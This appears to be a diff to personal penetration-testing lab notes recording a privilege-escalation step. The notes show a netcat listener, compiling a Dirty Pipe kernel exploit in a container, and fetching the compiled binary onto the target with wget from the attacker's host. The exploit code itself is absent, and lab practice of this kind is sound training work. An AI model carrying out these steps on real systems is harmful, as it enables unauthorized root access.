@@ -254,5 +254,21 @@ nc -nvlp 1234
 
 .157 privesc
 ```
+# looks like it's vulnerable to dirty pipe based on kernel version
+# create exploit files and copy to container root 
+sudo su -
+cd /home/kali/lab3
+cp exploit-1.c /var/lib/machines/xen-test/root/
 
+cd /var/lib/machines/xen-test/root
+sudo systemd-nspawn -M xen-test
+
+# compile exploit in container
+gcc -o exploit-1 exploit-1.c
+
+# copy back to lab folder
+cp exploit-1 /home/kali/lab3/
+
+# from target
+wget http://192.168.45.234/exploit-1
 ```
